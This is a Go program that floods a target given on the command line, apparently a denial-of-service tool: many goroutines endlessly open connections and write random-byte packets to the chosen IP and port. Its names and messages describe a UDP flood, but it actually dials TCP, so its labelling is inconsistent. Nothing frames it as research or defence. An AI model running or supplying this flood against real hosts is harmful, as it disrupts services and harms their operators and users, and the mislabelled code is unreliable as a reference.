package main

import (
	"fmt"
	"math/rand"
	"net"
	"os"
	"strconv"
	"sync"
	"time"
)

func sendUDPPacket(targetIP string, targetPort int, packetSize int, wg *sync.WaitGroup) {
	defer wg.Done()

	fmt.Printf("Sending UDP packet to %s:%d\n", targetIP, targetPort)

	for {
		conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", targetIP, targetPort))
		if err != nil {
			fmt.Printf("Failed to connect to %s:%d\n", targetIP, targetPort)
			continue
		}

		// Büyük bir ses paketi oluştur
		packet := make([]byte, packetSize)
		rand.Read(packet)

		_, err = conn.Write(packet)
		if err != nil {
			fmt.Printf("Failed to send UDP packet to %s:%d\n", targetIP, targetPort)
			continue
		}

		fmt.Printf("Sent UDP packet to %s:%d\n", targetIP, targetPort)

		conn.Close()
	}
}

func floodUDPPackets(targetIP string, targetPort int, packetSize int, threads int) {
	var wg sync.WaitGroup

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go sendUDPPacket(targetIP, targetPort, packetSize, &wg)
	}

	wg.Wait()

	fmt.Println("UDP packet flood finished.")
}

func main() {
	if len(os.Args) < 5 {
		fmt.Println("Usage: go run main.go [targetIP] [targetPort] [packetSize] [threads]")
		return
	}

	targetIP := os.Args[1]
	targetPort, err := strconv.Atoi(os.Args[2])
	if err != nil {
		fmt.Println("Invalid targetPort parameter.")
		return
	}

	packetSize, err := strconv.Atoi(os.Args[3])
	if err != nil {
		fmt.Println("Invalid packetSize parameter.")
		return
	}

	threads, err := strconv.Atoi(os.Args[4])
	if err != nil {
		fmt.Println("Invalid threads parameter.")
		return
	}

	rand.Seed(time.Now().UnixNano())

	floodUDPPackets(targetIP, targetPort, packetSize, threads)
}
